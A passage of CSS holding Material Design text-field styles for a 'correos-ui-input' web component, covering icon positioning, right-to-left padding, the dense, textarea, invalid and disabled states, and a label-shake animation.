		[dir=rtl].sc-correos-ui-input .mdc-text-field--with-trailing-icon.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input,
		.mdc-text-field--with-trailing-icon.sc-correos-ui-input .mdc-text-field__input[dir=rtl].sc-correos-ui-input {
			padding-left: 48px;
			padding-right: 16px
		}

		.mdc-text-field--with-trailing-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input {
			left: initial;
			right: 16px
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--with-trailing-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input,
		.mdc-text-field--with-trailing-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-text-field__icon[dir=rtl].sc-correos-ui-input {
			left: 16px;
			right: initial
		}

		.mdc-text-field--with-trailing-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
			padding-left: 16px;
			padding-right: 48px
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--with-trailing-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input,
		.mdc-text-field--with-trailing-icon.mdc-text-field--outlined.sc-correos-ui-input .mdc-text-field__input[dir=rtl].sc-correos-ui-input {
			padding-left: 48px;
			padding-right: 16px
		}

		.mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input {
			left: 16px;
			right: auto
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input,
		.mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.sc-correos-ui-input .mdc-text-field__icon[dir=rtl].sc-correos-ui-input {
			left: auto;
			right: 16px
		}

		.mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input~.mdc-text-field__icon.sc-correos-ui-input {
			right: 12px;
			left: auto
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input~.mdc-text-field__icon.sc-correos-ui-input,
		.mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input~.mdc-text-field__icon[dir=rtl].sc-correos-ui-input {
			right: auto;
			left: 12px
		}

		.mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
			padding-left: 48px;
			padding-right: 48px
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input,
		.mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.sc-correos-ui-input .mdc-text-field__input[dir=rtl].sc-correos-ui-input {
			padding-left: 48px;
			padding-right: 48px
		}

		.mdc-text-field--with-leading-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input,
		.mdc-text-field--with-trailing-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input {
			bottom: 16px;
			-webkit-transform: scale(0.8);
			transform: scale(0.8)
		}

		.mdc-text-field--with-leading-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input {
			left: 12px;
			right: initial
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input,
		.mdc-text-field--with-leading-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__icon[dir=rtl].sc-correos-ui-input {
			left: initial;
			right: 12px
		}

		.mdc-text-field--with-leading-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
			padding-left: 44px;
			padding-right: 16px
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input,
		.mdc-text-field--with-leading-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__input[dir=rtl].sc-correos-ui-input {
			padding-left: 16px;
			padding-right: 44px
		}

		.mdc-text-field--with-leading-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input {
			left: 44px;
			right: initial
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input,
		.mdc-text-field--with-leading-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label[dir=rtl].sc-correos-ui-input {
			left: initial;
			right: 44px
		}

		.mdc-text-field--with-trailing-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input {
			left: initial;
			right: 12px
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--with-trailing-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input,
		.mdc-text-field--with-trailing-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__icon[dir=rtl].sc-correos-ui-input {
			left: 12px;
			right: initial
		}

		.mdc-text-field--with-trailing-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
			padding-left: 16px;
			padding-right: 44px
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--with-trailing-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input,
		.mdc-text-field--with-trailing-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__input[dir=rtl].sc-correos-ui-input {
			padding-left: 44px;
			padding-right: 16px
		}

		.mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input {
			left: 12px;
			right: auto
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input,
		.mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__icon[dir=rtl].sc-correos-ui-input {
			left: auto;
			right: 12px
		}

		.mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input~.mdc-text-field__icon.sc-correos-ui-input {
			right: 12px;
			left: auto
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input~.mdc-text-field__icon.sc-correos-ui-input,
		.mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input~.mdc-text-field__icon[dir=rtl].sc-correos-ui-input {
			right: auto;
			left: 12px
		}

		.mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
			padding-left: 44px;
			padding-right: 44px
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input,
		.mdc-text-field--with-leading-icon.mdc-text-field--with-trailing-icon.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__input[dir=rtl].sc-correos-ui-input {
			padding-left: 44px;
			padding-right: 44px
		}

		.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
			-webkit-transform: translateY(-70%) scale(0.8);
			transform: translateY(-70%) scale(0.8)
		}

		.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label--shake.sc-correos-ui-input {
			-webkit-animation: mdc-floating-label-shake-float-above-text-field-dense 250ms 1;
			animation: mdc-floating-label-shake-float-above-text-field-dense 250ms 1
		}

		.mdc-text-field--dense.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
			padding: 12px 12px 0
		}

		.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input {
			font-size: 0.813rem
		}

		.mdc-text-field--dense.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
			font-size: 0.813rem
		}

		.mdc-text-field__input.sc-correos-ui-input:required~.mdc-floating-label.sc-correos-ui-input::after,
		.mdc-text-field__input.sc-correos-ui-input:required~.mdc-notched-outline.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input::after {
			margin-left: 1px;
			content: "*"
		}

		.mdc-text-field--textarea.sc-correos-ui-input {
			display: -ms-inline-flexbox;
			display: inline-flex;
			width: auto;
			height: auto;
			-webkit-transition: none;
			transition: none;
			overflow: visible
		}

		.mdc-text-field--textarea.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-notched-outline__leading.sc-correos-ui-input,
		.mdc-text-field--textarea.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-notched-outline__notch.sc-correos-ui-input,
		.mdc-text-field--textarea.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-notched-outline__trailing.sc-correos-ui-input {
			border-color: rgba(0, 0, 0, 0.38)
		}

		.mdc-text-field--textarea.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__input.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input,
		.mdc-text-field--textarea.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__input.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input,
		.mdc-text-field--textarea.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__input.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input,
		.mdc-text-field--textarea.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__icon.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input,
		.mdc-text-field--textarea.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__icon.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input,
		.mdc-text-field--textarea.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__icon.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input {
			border-color: rgba(0, 0, 0, 0.87)
		}

		.mdc-text-field--textarea.sc-correos-ui-input:not(.mdc-text-field--disabled).mdc-text-field--focused .mdc-notched-outline__leading.sc-correos-ui-input,
		.mdc-text-field--textarea.sc-correos-ui-input:not(.mdc-text-field--disabled).mdc-text-field--focused .mdc-notched-outline__notch.sc-correos-ui-input,
		.mdc-text-field--textarea.sc-correos-ui-input:not(.mdc-text-field--disabled).mdc-text-field--focused .mdc-notched-outline__trailing.sc-correos-ui-input {
			border-color: #6200ee;
			border-color: var(--mdc-theme-primary, #6200ee)
		}

		.mdc-text-field--textarea.sc-correos-ui-input .mdc-floating-label--shake.sc-correos-ui-input {
			-webkit-animation: mdc-floating-label-shake-float-above-textarea 250ms 1;
			animation: mdc-floating-label-shake-float-above-textarea 250ms 1
		}

		.mdc-text-field--textarea.sc-correos-ui-input .mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input {
			border-radius: 4px 0 0 4px
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--textarea.sc-correos-ui-input .mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input,
		.mdc-text-field--textarea.sc-correos-ui-input .mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__leading[dir=rtl].sc-correos-ui-input {
			border-radius: 0 4px 4px 0
		}

		.mdc-text-field--textarea.sc-correos-ui-input .mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input {
			border-radius: 0 4px 4px 0
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--textarea.sc-correos-ui-input .mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input,
		.mdc-text-field--textarea.sc-correos-ui-input .mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__trailing[dir=rtl].sc-correos-ui-input {
			border-radius: 4px 0 0 4px
		}

		.mdc-text-field--textarea.sc-correos-ui-input::before,
		.mdc-text-field--textarea.sc-correos-ui-input::after {
			content: none
		}

		.mdc-text-field--textarea.sc-correos-ui-input:not(.mdc-text-field--disabled) {
			background-color: transparent
		}

		.mdc-text-field--textarea.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
			-webkit-transform: translateY(-144%) scale(1);
			transform: translateY(-144%) scale(1)
		}

		.mdc-text-field--textarea.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
			font-size: 0.75rem
		}

		.mdc-text-field--textarea.mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
		.mdc-text-field--textarea.sc-correos-ui-input .mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
			-webkit-transform: translateY(-130%) scale(0.75);
			transform: translateY(-130%) scale(0.75)
		}

		.mdc-text-field--textarea.mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
		.mdc-text-field--textarea.sc-correos-ui-input .mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
			font-size: 1rem
		}

		.mdc-text-field--textarea.sc-correos-ui-input .mdc-text-field-character-counter.sc-correos-ui-input {
			left: initial;
			right: 16px;
			position: absolute;
			bottom: 13px
		}

		[dir=rtl].sc-correos-ui-input .mdc-text-field--textarea.sc-correos-ui-input .mdc-text-field-character-counter.sc-correos-ui-input,
		.mdc-text-field--textarea.sc-correos-ui-input .mdc-text-field-character-counter[dir=rtl].sc-correos-ui-input {
			left: 16px;
			right: initial
		}

		.mdc-text-field--textarea.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
			-ms-flex-item-align: auto;
			align-self: auto;
			-webkit-box-sizing: border-box;
			box-sizing: border-box;
			height: auto;
			margin: 8px 1px 1px 0;
			padding: 0 16px 16px;
			border: none;
			line-height: 1.75rem
		}

		.mdc-text-field--textarea.sc-correos-ui-input .mdc-text-field-character-counter.sc-correos-ui-input+.mdc-text-field__input.sc-correos-ui-input {
			margin-bottom: 28px;
			padding-bottom: 0
		}

		.mdc-text-field--textarea.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input {
			top: 17px;
			width: auto;
			pointer-events: none
		}

		.mdc-text-field--textarea.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input:not(.mdc-floating-label--float-above) {
			-webkit-transform: none;
			transform: none
		}

		.mdc-text-field--textarea.mdc-text-field--focused.sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input,
		.mdc-text-field--textarea.mdc-text-field--focused.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input,
		.mdc-text-field--textarea.mdc-text-field--focused.sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input {
			border-width: 2px
		}

		.mdc-text-field--fullwidth.sc-correos-ui-input {
			width: 100%
		}

		.mdc-text-field--fullwidth.sc-correos-ui-input:not(.mdc-text-field--textarea) {
			display: block
		}

		.mdc-text-field--fullwidth.sc-correos-ui-input:not(.mdc-text-field--textarea)::before,
		.mdc-text-field--fullwidth.sc-correos-ui-input:not(.mdc-text-field--textarea)::after {
			content: none
		}

		.mdc-text-field--fullwidth.sc-correos-ui-input:not(.mdc-text-field--textarea):not(.mdc-text-field--disabled) {
			background-color: transparent
		}

		.mdc-text-field--fullwidth.sc-correos-ui-input:not(.mdc-text-field--textarea) .mdc-text-field__input.sc-correos-ui-input {
			padding: 0
		}

		.mdc-text-field--fullwidth.mdc-text-field--textarea.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
			resize: vertical
		}

		.mdc-text-field--fullwidth.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--textarea) {
			border-bottom-color: #b00020;
			border-bottom-color: var(--mdc-theme-error, #b00020)
		}

		.mdc-text-field-helper-line.sc-correos-ui-input {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-pack: justify;
			justify-content: space-between;
			-webkit-box-sizing: border-box;
			box-sizing: border-box
		}

		.mdc-text-field--dense.sc-correos-ui-input+.mdc-text-field-helper-line.sc-correos-ui-input {
			margin-bottom: 4px
		}

		.mdc-text-field.sc-correos-ui-input+.mdc-text-field-helper-line.sc-correos-ui-input {
			padding-right: 16px;
			padding-left: 16px
		}

		.mdc-form-field.sc-correos-ui-input>.mdc-text-field.sc-correos-ui-input+label.sc-correos-ui-input {
			-ms-flex-item-align: start;
			align-self: flex-start
		}

		.mdc-text-field--focused.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-floating-label.sc-correos-ui-input {
			color: rgba(98, 0, 238, 0.87)
		}

		.mdc-text-field--focused.sc-correos-ui-input+.mdc-text-field-helper-line.sc-correos-ui-input .mdc-text-field-helper-text.sc-correos-ui-input:not(.mdc-text-field-helper-text--validation-msg) {
			opacity: 1
		}

		.mdc-text-field--textarea.mdc-text-field--focused.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-notched-outline__leading.sc-correos-ui-input,
		.mdc-text-field--textarea.mdc-text-field--focused.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-notched-outline__notch.sc-correos-ui-input,
		.mdc-text-field--textarea.mdc-text-field--focused.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-notched-outline__trailing.sc-correos-ui-input {
			border-color: #6200ee;
			border-color: var(--mdc-theme-primary, #6200ee)
		}

		.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--outlined):not(.mdc-text-field--textarea) .mdc-text-field__input.sc-correos-ui-input {
			border-bottom-color: #b00020;
			border-bottom-color: var(--mdc-theme-error, #b00020)
		}

		.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--outlined):not(.mdc-text-field--textarea) .mdc-text-field__input.sc-correos-ui-input:hover {
			border-bottom-color: #b00020;
			border-bottom-color: var(--mdc-theme-error, #b00020)
		}

		.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-line-ripple.sc-correos-ui-input {
			background-color: #b00020;
			background-color: var(--mdc-theme-error, #b00020)
		}

		.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-floating-label.sc-correos-ui-input {
			color: #b00020;
			color: var(--mdc-theme-error, #b00020)
		}

		.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled).mdc-text-field--invalid+.mdc-text-field-helper-line.sc-correos-ui-input .mdc-text-field-helper-text--validation-msg.sc-correos-ui-input {
			color: #b00020;
			color: var(--mdc-theme-error, #b00020)
		}

		.mdc-text-field--invalid.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
			caret-color: #b00020;
			caret-color: var(--mdc-theme-error, #b00020)
		}

		.mdc-text-field--invalid.mdc-text-field--with-trailing-icon.sc-correos-ui-input:not(.mdc-text-field--with-leading-icon):not(.mdc-text-field--disabled) .mdc-text-field__icon.sc-correos-ui-input {
			color: #b00020;
			color: var(--mdc-theme-error, #b00020)
		}

		.mdc-text-field--invalid.mdc-text-field--with-trailing-icon.mdc-text-field--with-leading-icon.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-text-field__icon.sc-correos-ui-input~.mdc-text-field__icon.sc-correos-ui-input {
			color: #b00020;
			color: var(--mdc-theme-error, #b00020)
		}

		.mdc-text-field--invalid.sc-correos-ui-input+.mdc-text-field-helper-line.sc-correos-ui-input .mdc-text-field-helper-text--validation-msg.sc-correos-ui-input {
			opacity: 1
		}

		.mdc-text-field--textarea.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-notched-outline__leading.sc-correos-ui-input,
		.mdc-text-field--textarea.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-notched-outline__notch.sc-correos-ui-input,
		.mdc-text-field--textarea.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-notched-outline__trailing.sc-correos-ui-input {
			border-color: #b00020;
			border-color: var(--mdc-theme-error, #b00020)
		}

		.mdc-text-field--textarea.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__input.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input,
		.mdc-text-field--textarea.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__input.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input,
		.mdc-text-field--textarea.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__input.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input,
		.mdc-text-field--textarea.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__icon.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input,
		.mdc-text-field--textarea.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__icon.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input,
		.mdc-text-field--textarea.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__icon.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input {
			border-color: #b00020;
			border-color: var(--mdc-theme-error, #b00020)
		}

		.mdc-text-field--textarea.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled).mdc-text-field--focused .mdc-notched-outline__leading.sc-correos-ui-input,
		.mdc-text-field--textarea.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled).mdc-text-field--focused .mdc-notched-outline__notch.sc-correos-ui-input,
		.mdc-text-field--textarea.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled).mdc-text-field--focused .mdc-notched-outline__trailing.sc-correos-ui-input {
			border-color: #b00020;
			border-color: var(--mdc-theme-error, #b00020)
		}

		.mdc-text-field--outlined.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-notched-outline__leading.sc-correos-ui-input,
		.mdc-text-field--outlined.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-notched-outline__notch.sc-correos-ui-input,
		.mdc-text-field--outlined.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-notched-outline__trailing.sc-correos-ui-input {
			border-color: #b00020;
			border-color: var(--mdc-theme-error, #b00020)
		}

		.mdc-text-field--outlined.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__input.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input,
		.mdc-text-field--outlined.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__input.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input,
		.mdc-text-field--outlined.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__input.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input,
		.mdc-text-field--outlined.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__icon.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input,
		.mdc-text-field--outlined.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__icon.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input,
		.mdc-text-field--outlined.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--focused) .mdc-text-field__icon.sc-correos-ui-input:hover~.mdc-notched-outline.sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input {
			border-color: #b00020;
			border-color: var(--mdc-theme-error, #b00020)
		}

		.mdc-text-field--outlined.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled).mdc-text-field--focused .mdc-notched-outline__leading.sc-correos-ui-input,
		.mdc-text-field--outlined.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled).mdc-text-field--focused .mdc-notched-outline__notch.sc-correos-ui-input,
		.mdc-text-field--outlined.mdc-text-field--invalid.sc-correos-ui-input:not(.mdc-text-field--disabled).mdc-text-field--focused .mdc-notched-outline__trailing.sc-correos-ui-input {
			border-color: #b00020;
			border-color: var(--mdc-theme-error, #b00020)
		}

		.mdc-text-field--disabled.sc-correos-ui-input {
			background-color: #fafafa;
			border-bottom: none;
			pointer-events: none
		}

		.mdc-text-field--disabled.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
			border-bottom-color: rgba(0, 0, 0, 0.06)
		}

		.mdc-text-field--disabled.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
			color: rgba(0, 0, 0, 0.37)
		}

		.mdc-text-field--disabled.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input {
			color: rgba(0, 0, 0, 0.37)
		}

		.mdc-text-field--disabled.sc-correos-ui-input+.mdc-text-field-helper-line.sc-correos-ui-input .mdc-text-field-helper-text.sc-correos-ui-input {
			color: rgba(0, 0, 0, 0.37)
		}

		.mdc-text-field--disabled.sc-correos-ui-input .mdc-text-field-character-counter.sc-correos-ui-input,
		.mdc-text-field--disabled.sc-correos-ui-input+.mdc-text-field-helper-line.sc-correos-ui-input .mdc-text-field-character-counter.sc-correos-ui-input {
			color: rgba(0, 0, 0, 0.37)
		}

		.mdc-text-field--disabled.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input {
			color: rgba(0, 0, 0, 0.3)
		}

		.mdc-text-field--disabled.sc-correos-ui-input:not(.mdc-text-field--textarea) {
			border-bottom-color: rgba(0, 0, 0, 0.12)
		}

		.mdc-text-field--disabled.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input {
			cursor: default
		}

		.mdc-text-field--textarea.mdc-text-field--disabled.sc-correos-ui-input {
			background-color: transparent;
			background-color: #f9f9f9
		}

		.mdc-text-field--textarea.mdc-text-field--disabled.sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input,
		.mdc-text-field--textarea.mdc-text-field--disabled.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input,
		.mdc-text-field--textarea.mdc-text-field--disabled.sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input {
			border-color: rgba(0, 0, 0, 0.06)
		}

		.mdc-text-field--textarea.mdc-text-field--disabled.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
			border-bottom: none
		}

		@-webkit-keyframes mdc-floating-label-shake-float-above-text-field-dense {
			0% {
				-webkit-transform: translateX(calc(0 - 0%)) translateY(-70%) scale(0.8);
				transform: translateX(calc(0 - 0%)) translateY(-70%) scale(0.8)
			}

			33% {
				-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
				-webkit-transform: translateX(calc(4% - 0%)) translateY(-70%) scale(0.8);
				transform: translateX(calc(4% - 0%)) translateY(-70%) scale(0.8)
			}

			66% {
				-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
				-webkit-transform: translateX(calc(-4% - 0%)) translateY(-70%) scale(0.8);
				transform: translateX(calc(-4% - 0%)) translateY(-70%) scale(0.8)
			}

			100% {
				-webkit-transform: translateX(calc(0 - 0%)) translateY(-70%) scale(0.8);
				transform: translateX(calc(0 - 0%)) translateY(-70%) scale(0.8)
			}
		}

		@keyframes mdc-floating-label-shake-float-above-text-field-dense {
			0% {
				-webkit-transform: translateX(calc(0 - 0%)) translateY(-70%) scale(0.8);
